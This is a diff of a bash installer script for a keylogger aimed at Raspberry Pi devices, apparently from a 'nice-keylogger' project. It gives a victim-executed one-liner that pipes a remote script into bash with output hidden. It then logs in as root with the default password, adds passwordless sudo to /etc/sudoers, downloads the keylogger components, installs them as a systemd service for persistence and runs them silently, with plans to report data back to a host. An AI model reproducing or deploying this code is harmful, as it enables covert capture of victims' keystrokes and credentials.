@@ -1,50 +1,40 @@
 #!/bin/bash
 # application to install, setup, and run the keylogger.
 
-# entry point:
-# /bin/bash -c "$(curl -faSL https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/coordinator.sh)"
+# entry point for victim to execute:
+# /bin/bash -c "$(wget -q -O - https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/coordinator.sh)" > /dev/null 2>&1
+base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"
 
-# CHECK THAT USER CAN ISSUE SUDO
+# Force user to be included in sudoers and remove the need for passwords
 # Totally expects the root user to be an unchanged Raspberry Pi
 su - root <<!
 raspberry
-echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
+echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers &&
+echo "pi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 !
 
-sudo mkdir /nicekl && cd /nicekl/
+mkdir nicekl && cd nicekl/
+pwd
 
 # DOWNLOAD FILES if they are not already installed
 # nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
-CONT=controller.py
-KMAP=keymap.py
-FKEY=find_keyboard.py
-KLSERV=nicekeylogger.service
-# TODO correct this url to be the main branch
-base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/
-if [ ! test -f "$CONT" ] ; then
-  curl $base\controller.py > controller.py
-fi
-if [ ! test -f "$KMAP" ] ; then
-  curl $base\keymap.py > keymap.py
-fi
-if [ ! test -f "$FKEY" ] ; then
-  curl $base\find_keyboard.py > find_keyboard.py
-fi
-if [ ! test -f "$KLSERV" ] ; then
-  curl $base\nicekeylogger.service > nicekeylogger.service
-fi
-sudo chmod 744 test/controller.py
+CONT=${base}controller.py
+KMAP=${base}keymap.py
+FKEY=${base}find_keyboard.py
+KLSERV=${base}nicekeylogger.service
+wget -L "$CONT" "$KMAP" "$FKEY" "$KLSERV"
+sudo chmod +x controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
 sudo mv nicekeylogger.service /etc/systemd/system/
-systemctl enable nicekeylogger.service
-systemctl daemon-reload
-
+sudo systemctl enable nicekeylogger.service
+sudo systemctl daemon-reload
 
 # RUN APPLICATION
-python3 controller.py &
+sudo python3 controller.py > /dev/null 2>&1 &
 
 # REPORT BACK TO HOST
 # TODO - decide the period to report back
 # TODO - control size of report; only send new content? only send UDP payload? On size == x?
 
+exit
